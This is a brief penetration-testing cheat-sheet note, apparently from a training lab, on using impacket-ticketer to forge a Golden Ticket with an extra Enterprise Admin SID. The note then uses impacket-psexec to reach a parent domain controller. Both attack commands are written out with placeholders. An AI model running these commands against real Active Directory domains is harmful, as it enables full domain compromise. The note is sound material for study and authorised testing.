---
tags:
  - linux
  - sid-abuse
---
Creates Golden Ticket just like with [[Mimikatz#Golden Ticket|Mimikatz]] and [[Rubeus#Golden Ticket|Rubeus]]
```shell-session
$ impacket-ticketer -nthash <KRBTGT-NTHASH> -domain <CHILD-DOMAIN-FQDN> -domain-sid <CHILD-DOMAIN-SID> -extra-sid <ENTERPRISE-ADMIN-SID> <USER>
```
This is saved as `.ccache` file which can be exported to `KRB5CCNAME` for usage and confirmed with [[klist]].

This should enable us to authenticate to parent domain's DC using [[PsExec]]:
```shell-session
$ impacket-psexec <CHILD-DOMAIN-FQDN>/<USER>@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip <DC-IP>
```
Alternatively, we can use [[raiseChild]] 